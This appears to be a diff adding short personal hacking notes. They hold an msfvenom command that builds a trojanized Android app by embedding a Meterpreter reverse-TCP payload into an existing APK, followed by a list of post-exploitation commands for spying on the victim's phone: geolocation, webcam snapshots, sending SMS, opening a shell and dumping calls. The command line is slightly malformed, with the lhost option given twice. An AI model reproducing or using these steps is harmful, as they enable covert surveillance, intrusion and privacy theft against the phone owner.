@@ -1,0 +1,15 @@
+
+msfvenom -x uc.apk -p android/meterpreter/reverse_tcp lhost = 192.168.0.102 lhost=222 -o ucmini.apk
+
+
+android:-
+hacking 
+1.sysinfo
+2.geolocate
+3.webcam_snap
+4.send_sms
+	send_sms -d 98291 -t hacki
+5. shell
+6.dump_callling
+7.sessions -i 1
+8.webcam_list 
